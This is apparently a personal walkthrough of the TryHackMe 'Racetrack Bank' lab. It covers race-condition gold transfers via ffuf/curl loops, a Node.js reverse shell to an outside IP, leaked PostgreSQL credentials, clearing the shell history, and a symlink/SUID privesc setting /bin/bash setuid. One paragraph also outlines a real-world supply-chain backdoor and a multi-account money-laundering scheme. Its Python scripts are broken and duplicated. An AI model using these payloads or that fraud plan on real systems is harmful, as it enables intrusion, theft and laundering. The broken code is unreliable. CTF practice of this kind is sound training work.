# Racetrack-Bank Helped-Through

Name: Racetrack-Bank
Date:  23/01/2023
Difficulty:  Hard
Goals:  
- Learn about how custom exploits creating
- Practice social interaction over chats online - Promote "**stop!** listen - and ask good questions"  - ask 5 questions one per section of the box 
- Practice social interaction over text chat - research tips from actually white papers, experts in SE
Learnt:
- PostGreSQL basics and practice
- ffuf for the win!
- Web site race condition exploits
Beyond Root:
- Being a better digital communicator; use all you have research to script out in a one-take improv of a chat discourse were you are try to explain this machine in two sentences maximum per interaction the box, self moderating tone and content.

Digital communication via Chats and DMs is not a strength of mine. I am people person with good SE, where most of the modern world post covid spent their days on Zoom and Discord, I was on the front lines talking to people. I know I have some catching up to do in that respect. These channels of communication will not go away. [Cthulhu Cthursday: TryHackMe's "RacetrackBank"](https://www.youtube.com/watch?v=mF2HJq4kaVE) will be a practice and further research os Online Social Skill 101 ++;  I made an arse of myself twice - being incorrect in the hope of helping, decided not pollute the evening or anyone elses and consider how to actually communicate over chat. My conclusions being that it is just of context - set and setting issue tied to wanting to be social in with other that like this stuff while I never have used chat on phones or discord, twitch, twitter, facebook. Email is just glorifed letters that make people waste their time deleting them. Decided I did not want this inital failure to be damaging as it copuld have been during turning almost user on [[Support-Helped-Through]] will is imperative practice being chat without being in chat and research how to connect my provably excellent social skills in-person to online.  

#### Question 1 

Without giving away of your TTPs for KOTH, but what was the most interesting KOTH TTPs that wrinkled your brain really hard during a KOTH or varients?  
-> Reduce and more open:
- Most interesting KOTH stories and TTPs witnessed or heard of?

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)



The Root Web Page on port 80.
![1080](rootwebpage.png)

API to fuzz
![](apidirectory.png)

```bash
ffuf -u http://10.10.53.115/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt:FUZZ
```

![1080](bigadminaccountcreation.png)

Account tiering is present
![1080](weneedoneofthese.png)
For some reason chat really likes ZAP and Al really does not like ZAP. 

Jason Haddix uses ZAP in the most recent Web Hacking methodology for Bug Hunting  
![1080](nogiveselfgold.png)

Either we make lot of accounts to make one pool of Gold
![1080](apiendpointdisclosed.png)
Vulnerabiliies mentioned by chat
1. Give Self 
2. Integer Overflow
3. Create 10k accounts and give accounts.
4. Race conditions 
	- An exploitable condition that race the backend server to completing this condition. 
		- Attempt to run two ffuf/wfuzz:
			- One of each account to pass gold from target before other account



## Exploit

```bash
for i in seq {0..9999}; do echo "1" >> 10kOnes.txt; done
```


Wfuzz and ffuf commands
```bash
BIGADMINCOOKIE=
LITTLEADMINCOOKIE=
PAYLOAD=10kOnes.txt
HOST="10.10.10.10"
# Wfuzz - bigadmin
wfuzz -H 'Cookie: connect.sid=$BIGADMINCOOKIE' -d 'user=$USER$&amount=1&addition=FUZZ' -u http://$HOST/api/givegold -X POST -w $PAYLOAD3 -t 5
# ffuf 
ffuf -u http://$HORT/api/givegold -X POST -b 'Cookie: connect.sid=$COOKIE' -d 'user=USER&amount=1&addition=FUZZ' -t 5
```

My not working python code while watching Al - I will finish this as part getting my teeth around using the requests library and 
```python 
import multiprocessing as mp
import threading, os subprocess
from typing import Any, Awaitable

async def run_sequence(*functions: Awaitable[Any]) -> None:
for function in functions:
	await function

async def create_subproc(cmd, args):
process = subprocess.Popen(["{cmd}", "{args}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
process.wait()

async def exec_racecond_exploit(host, api_endpoint, data_field_one, data_field_dst, cookie_src, cookie_dst, method, thread_amount):
with open(payload, "r") as f:
            words = f.read()
			for i,word in enumerate(words):
src_args = f"http://{host}/{api_endpoint} -d \'{data_field_src}&payload={word}\' -b \'Cookie: {cookie_src}\' -X {method}"
dst_args = f"http://{host}/{api_endpoint} -d \'{data_field_dst}&payload={word}\' -b \'Cookie: {cookie_dst}\' -X {method}"
	await run_sequence(
		create_subproc("curl", src_args),
		create_subproc("curl", dst_args),
					  )
# Display counts with i variable from the enumerate(words) for output

def main():
# Cookie provide all but "Cookie: " 
BIGADMINCOOKIE = ""
LITTLEADMINCOOKIE = ""
# filepath to payload to fuzz through this only matters for amount of words in the wordlist that is called payload for the field in the data curl sends 
PAYLOAD = "10kOnes.txt"
HOST = f"10.10.10.10"

exec_racecond_exploit()
os.exit()
```
As with some python scripting endevours, it always seems to get way to bulky for a problem this simple.[The awesome briskets](https://briskets.io/racetrackbank/), pretty sure a HackTheBox Battlegrounds tournament player if memory serves me. 
```bash
#!/bin/bash
# Loop a curl request and make the request pretty much asyncronous by using &. sleep for .1 to give the server some breathing room.

for i in {1..10000}; do sleep .1; curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.49.4' -H $'Referer: http://10.10.49.4/giving.html' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Connection: close' -H $'Cookie: connect.sid=s%3AloGEpB2jcgVqozA1xqQ3s5npi7cvl5UZ.qyofrEMNbLo2bFJQwRB3vuPzc%2FsLeRPwgVelg95IFGU' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'s%3AloGEpB2jcgVqozA1xqQ3s5npi7cvl5UZ.qyofrEMNbLo2bFJQwRB3vuPzc%2FsLeRPwgVelg95IFGU' \
    --data-binary $'user=bigadmin&amount=1' \
    $'http://10.10.49.4/api/givegold' & done
```
The reason I like this is that it does not have the issues of speed that python runs into once a loop of any kind gets involved. All I changed was the username and the cookie of littleadmin. This spammed aload of curl, but only netted me 11 gold.

![](11GOLDs.png)

Get file full of ones
```bash
for i in {1..10000}; do echo "1" | tee -a 10kOnes.txt ; done
```
Instead, because it is in Go and the HTB academy module is awesome; making sure to change the cookie. I also added the briskets header additions 
```bash
ffuf -u http://10.10.49.4/api/givegold -H 'Referer: http://10.10.49.4/giving.html' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Connection: close' -H 'Cookie: connect.sid=s%3AQSVE282sEBDFsmTnO4nh3-sLN5WCMZgJ.YCjyZUNnxq9QwYdrtKJ5FG9%2FGv0pLW3KWuLtXNDGLCE' -d 'user=bigadmin&amount=FUZZ' -X POST -w 10kOnes.txt:FUZZ
```
Tested with `curl`
![](testingwithcurl.png)

I tested with threading amounts. The probably is that we doing this really hacky way that is observerably not the most efficient. Although I could not fluster up a nice 10k to bigadmin in one go I am happy I exploited this partial by myself with ffuf in a better way than Al.

I think the best way to make this a stealth as possible would be a javascript supply chain attack and create a the dev branch to the api, backdooring it. This functionality would similar to the legitmate API call but underhand the in-use code and impersonate the actual functionality and API traffic. Create 50 or so accounts, fleet 50 VMs across multiple regions over a month and script each to perform a complex jittered passing around of legitmate traffic of funds that emulated transactions that all slow shift to one account in a chain A -> B -> C -> D -> Final -> E -> F .... Which would always leave the Final account at net increase. This would:
1. Be a nightmare to figure out were the funds ended up before dumping if it was caught mid
2. Try to seem like real funds moving that occurs in Banks between accounts
3. Have a shadow banking fake backstory to the accounts
4. Make it harder to figurer out where the issue was in the original code as it would look legitmate
	1. Even if it then got found the destination account would be harder to trace as it would look like the circle vortex of chaining of transactions.
5. Multiple Destination accounts could more emulative of ATPs  exfiltrating more to launder the money via multiple channels of redundancy.

##### Chat-Training

When stream asks for something do not just spert out the first thing. 
People do not like being called out.

![1080](richwithoutthethreadflag.png)

##### Question 2 

How this be exploited in the real world by Red Teams, if they had already compromised the webserver and jsut wanted to demonstrate transference traffic to emulate APTs?





##### Question 3 

## Foothold

![](calculateRCE.png)
I got a 504; we need to use the node the js and the vulnerable functions.

```js
require('child_process').exec('bash -c "exec bash -i &>/dev/tcp/10.11.3.193/8888 <&1"')
```

##### Question 4

How would you patch this RCE?

![](brianshell.png)

There is a admin directory in the brian home directory 
![](accounts.png)

Al makes me remember to always check the webroot directory...
```php
DATABASE_URL=postgres://brian:superstrongpass@localhost:5432/racetrackbank
PG_PASSWORD=superstrongpass
```
I had probably with the psql client so I created and ssh key. We actually get some PostGreSQL knowledge 

[Postgresql](https://www.postgresql.org/docs/current/app-psql.html) clients -
```bash
which pgadmin3
which psql
# Login
psql -d $dbname -U $user 
# Exit 
\q
# Command 
psql -c '\x' -c 'SELECT * FROM foo;'


psql -U brian -d racetrackbank
# list databases
\d
# Old faithful
select * from users;
# change a table
update users set premium='t' where id=3;
```
Littleadmin has premium!
![](littleadminhaspremium.png)

Clean up the PostGreSQL history file
```bash
echo "" > .ps_history
```

## PrivEsc

The `manageaccounts` is a suid binary owned by root
![](manageMANAGE.png)
![](cleanupdotshisrunbyroot.png)

Create a symbolic linked file
```bash
ln -s /home/brian/cleanup/cleanupscript.sh nvm.account
cd admin
./manageaccounts 
> f
Enter the path to the account file you want to open:
../nvm.account
File read successful!

> n

Enter the new note for the file:
chmod u+s /bin/bash
Note set successfully!
> w
Changes written.

> q
```

![](binbashroot.png)
And root
![](yoyoyo.png)

The rationale behind the this Priv Esc is the root is performing a cleanup script that can be symlinked to an account file, then using the manageaccount setuid binary we can write to disk to force root to make bash set uid. 

## Beyond Root

##### Question 6
What mitigations and redemiation would you write in a report fix this exploit? 

## One Account to Rule them all!


I started writing this to see if it would work
```python 
import asyncio, threads, os, requests

host = "http://"
login_path = "/"
password = "asd"


def create_account():	

def login_and_give_gold(target_account, users_file):
with open(users_file, "r") as f:
users = f.readlines()
	for user in users:
		user = str(user.replace("\n", ""))
	# request lib

def main():
	password = "asd"
	target_account = "PoolOfGold"
	host = "http://"
	login_path = "/"
	give_gold_path = "/"
	password = "asd"
	users_file
	create_account(target_account)		
	
```


```python 
import multiprocessing as mp
import threading, os subprocess
from typing import Any, Awaitable

async def run_sequence(*functions: Awaitable[Any]) -> None:
for function in functions:
	await function

async def create_subproc(cmd, args):
process = subprocess.Popen(["{cmd}", "{args}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
process.wait()

async def exec_racecond_exploit(host, api_endpoint, data_field_one, data_field_dst, cookie_src, cookie_dst, method, thread_amount):
with open(payload, "r") as f:
            words = f.read()
			for i,word in enumerate(words):
src_args = f"http://{host}/{api_endpoint} -d \'{data_field_src}&payload={word}\' -b \'Cookie: {cookie_src}\' -X {method}"
dst_args = f"http://{host}/{api_endpoint} -d \'{data_field_dst}&payload={word}\' -b \'Cookie: {cookie_dst}\' -X {method}"
	await run_sequence(
		create_subproc("curl", src_args),
		create_subproc("curl", dst_args),
					  )
# Display counts with i variable from the enumerate(words) for output

def main():
# Cookie provide all but "Cookie: " 
BIGADMINCOOKIE = ""
LITTLEADMINCOOKIE = ""
# filepath to payload to fuzz through this only matters for amount of words in the wordlist that is called payload for the field in the data curl sends 
PAYLOAD = "10kOnes.txt"
HOST = f"10.10.10.10"

exec_racecond_exploit()
os.exit()
```